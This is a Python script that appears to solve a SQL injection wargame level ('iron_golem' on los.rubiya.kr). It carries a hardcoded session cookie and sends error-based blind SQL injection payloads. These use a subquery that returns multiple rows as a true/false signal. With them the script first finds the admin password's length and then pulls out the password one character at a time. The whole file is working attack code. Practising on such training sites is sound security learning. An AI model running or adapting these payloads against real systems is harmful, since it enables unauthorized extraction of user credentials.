import requests

cookies={'PHPSESSID':'48uo5rpb8nd8v97tejncdtag9v'}
length=32
hex_value="0123456789abcdefghijklmnopqrstuvwxyz"
while True:
    address="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
    url=address+ "?pw= 'or id='admin' and if(length(pw)="+str(length)+",(select 1 union select 2),2)%23"
    res=requests.get(url,cookies=cookies)
    length+=1

    if "Subquery " in res.text:
        length-=1
        print("pw는 "+str(length)+"자리")
        break
    else:
        print(str(length-1)+": X")
        

i=length
pw=""
for a in range(1,i+1):
    for b in range(33,128):
        url= address+ "?pw= 'or id='admin' and if(ascii(substr(pw,"+str(a)+",1))="+str(b)+",(select 1 union select 2),2)%23"
        res=requests.get(url,cookies=cookies)

        if"Subquery" in res.text:
            print(str(a)+"of pw=>"+chr(b))
            pw+=chr(b)
            break
print(pw)
